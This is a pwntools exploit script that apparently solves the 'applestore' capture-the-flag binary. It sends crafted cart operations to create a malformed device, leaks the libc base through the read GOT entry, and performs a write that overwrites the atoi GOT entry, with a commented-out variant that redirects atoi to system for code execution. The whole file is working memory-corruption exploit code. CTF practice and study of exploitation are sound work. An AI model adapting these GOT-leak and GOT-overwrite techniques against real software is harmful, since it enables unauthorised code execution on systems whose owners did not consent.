from pwn import *


applestore = ELF('applestore')
libc = ELF('libc_32.so.6')


class Prompts:
    CHOICE = '> '
    DEV_NUM = 'Device Number> '
    ITEM_NUM = 'Item Number> '
    CART_CHECK = 'Let me check your cart. ok? (y/n) > '


class Choices:
    ADD = '2'
    DELETE = '3'
    CART = '4'
    CHECKOUT = '5'


p = gdb.debug(
    applestore.path,
    '''
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


def leak_libc():
    print('[*] Leaking the address of libc.')
    p.sendafter(Prompts.CHOICE, Choices.DELETE)
    p.sendafter(Prompts.ITEM_NUM, b'27' + p32(applestore.got['read']) + p32(0) * 3)
    p.recvuntil('Remove 27:')
    libc_base_addr = u32(p.recvn(4)) - libc.sym['read']
    print(f'[*] libc base address: {hex(libc_base_addr)}')
    return libc_base_addr


def add_devices():
    devices = {3: 3,  2: 11, 1: 12}
    print('[*] Adding devices to get a 1$ device which isn\'t inserted into the device list correctly.')
    for dev_index, add_count in devices.items():
        for _ in range(add_count):
            p.sendafter(Prompts.CHOICE, Choices.ADD)
            p.sendafter(Prompts.DEV_NUM, str(dev_index))


def insert_malformed_device():
    print('[*] Checking out to insert the malformed device.')
    p.sendafter(Prompts.CHOICE, Choices.CHECKOUT)
    p.sendafter(Prompts.CART_CHECK, 'y')

def replace_atoi_and_system(atoi_addr, system_addr):
    rand_str = 0x08048F4C
    print('[*] Replace atoi and system GOT entries.')
    p.sendafter(Prompts.CHOICE, Choices.DELETE)
    p.sendafter(Prompts.ITEM_NUM, b'27' + p32(rand_str) + p32(0) + p32(atoi_addr - 0xc) + p32(system_addr))



def main():
    add_devices()
    insert_malformed_device()
    libc_base = leak_libc()
    # replace_atoi_and_system(applestore.got['atoi'], libc_base + libc.sym['system'])
    replace_atoi_and_system(applestore.got['atoi'], applestore.got['exit'])


if __name__ == "__main__":
    main()
